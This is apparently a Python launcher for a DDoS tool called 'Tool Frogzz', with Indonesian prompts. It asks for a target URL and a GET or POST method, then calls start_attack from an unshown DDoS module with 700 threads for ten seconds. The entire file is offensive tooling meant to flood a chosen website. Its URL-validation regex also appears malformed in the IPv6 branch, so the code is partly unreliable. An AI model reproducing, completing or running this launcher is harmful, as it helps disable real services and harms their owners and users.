from DDoS_V0.5.py import start_attack
import re

def validate_url(url):
    # Validasi URL menggunakan regex
    regex = re.compile(
        r'^(?:http|https)://'
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]*[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]*[A-Z0-9-]+\.[A-Z]{2,6})|'  # domain...
        r'localhost|'  # localhost support
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # IPv4
        r'?[A-F0-9]*:[A-F0-9:]+?)'  # IPv6
        r'(?::\d+)?'  # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
    
    return re.match(regex, url) is not None

def menu():
    print("Welcome To Tool Frogzz")
    print("github : Frogzz")
    print("youtube : Frogzz")
    print("tiktok : Frogzz")
    print("\nPilih Menu")
    print("[1] DDoS Free Proxy")

def main():
    menu()
    choice = input("\nPilih angka sesuai pilihan (misalnya 1): ")

    if choice == '1':
        target = input("Masukkan URL target (contoh: http://123.45.67.89): ")
        
        if not validate_url(target):
            print("[!] URL tidak valid. Pastikan URL dimulai dengan http:// atau https://.")
            return
        
        method = input("Pilih metode serangan (GET/POST): ").upper()
        if method not in ['GET', 'POST']:
            print("[!] Pilihan metode serangan tidak valid. Pilih antara GET atau POST.")
            return

        threads = 700  # Jumlah thread yang ringan untuk HP
        duration = 10  # Durasi serangan dalam detik

        start_attack(target, method, threads, duration)

if __name__ == "__main__":
    main()